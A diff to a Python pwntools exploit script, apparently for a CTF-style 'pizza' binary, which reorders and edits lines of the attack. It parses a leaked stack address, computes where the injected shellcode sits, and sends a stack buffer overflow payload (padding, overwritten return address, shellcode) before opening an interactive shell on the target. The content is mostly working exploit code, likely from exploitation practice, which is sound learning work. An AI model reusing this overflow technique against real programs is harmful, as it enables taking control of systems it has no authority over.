@@ -1,4 +1,3 @@
-
 #!/usr/bin/env python3
 from pwn import *
 
@@ -28,10 +27,6 @@ leak = str(victim.recvline(), "latin-1").split()[-1]
 print(leak)
 leak_int = int(leak,16)
 
-#by looking at our prints we can see shell at top of stack is +10 
-#from our memory leak we want to put this in rip for the return
-shellcodeplace = leak_int + 0x20
-
 #the pizza number prompt 
 print(str(victim.recvline(), "latin-1"))
 victim.sendline(b"10")
@@ -44,6 +39,10 @@ print(str(victim.recvline(), "latin-1"))
 print(str(victim.recvline(), "latin-1"))
 print(str(victim.recvline(), "latin-1"))
 
+#by looking at our prints we can see shell at top of stack is +10 
+#from our memory leak we want to put this in rip for the return
+shellcodeplace = leak_int + 0x20
+
 #the buffer overflow
 #we need between 130 & 150 bytes
 input2 =  b"A"*128 + b"ZZZZZZZZ"+ p64(shellcodeplace) + shellcode 
@@ -54,7 +53,7 @@ print(str(victim.recvline(), "latin-1"))
 #victim.sendline(payload)
 victim.interactive()
 
-#generate a core file to check key values
+#generate a core file to check key value
 core = victim.corefile
 rsp = core.rsp
 rbp = core.rbp
